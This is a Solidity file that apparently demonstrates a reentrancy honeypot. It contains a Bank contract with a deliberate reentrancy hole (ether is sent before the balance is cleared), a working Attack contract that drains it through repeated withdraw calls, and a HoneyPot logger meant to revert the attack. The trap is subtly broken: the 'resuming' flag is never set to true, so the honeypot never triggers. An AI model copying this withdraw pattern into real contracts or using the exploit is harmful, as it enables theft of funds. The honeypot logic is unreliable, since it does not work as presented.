// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ILogger{
    event log(address initilator, uint amount, uint statusCode);
    function Log(address _initilator, uint _amount, uint _statusCode) external;
}

contract Logger is ILogger{
    function Log(address _initilator, uint _amount, uint _statusCode) public{
        emit log(_initilator, _amount, _statusCode);
    }
}

contract HoneyPot is ILogger{
    function Log(address, uint, uint _statusCode) public pure{
        if(_statusCode == 3){
            revert("HoneyPot");
        }
    } 
}

contract Bank is Logger {
    mapping (address => uint) balances;
    bool resuming;

    ILogger logger;

    constructor (address _logger) {
        logger = ILogger(_logger);
    }

    function deposit() public payable{
        balances[msg.sender] += msg.value;
        logger.Log(msg.sender, msg.value, 1);
    }

    function withdraw() public{
        if(resuming){
            _withdraw(msg.sender, 3);  
        }else{
            _withdraw(msg.sender, 2);
        }
        
    }

    function _withdraw(address initiator, uint statusCode) internal{
        (bool result, ) = msg.sender.call{value: balances[initiator]}("");

        if(!result){
            revert("failed transfer");
        }
        balances[initiator] = 0;
        logger.Log(msg.sender, msg.value, statusCode);
        resuming = false;
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}

contract Attack{
    Bank bank;
    uint constant PAY_AMOUNT = 1 ether;

    constructor(address _bank){
        bank = Bank(_bank);
    }

    function attack() public payable{
        bank.deposit{value: PAY_AMOUNT}();
        bank.withdraw();
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }

    receive() external payable{
        if(bank.getBalance() >= PAY_AMOUNT){
            bank.withdraw();
        }
    }
}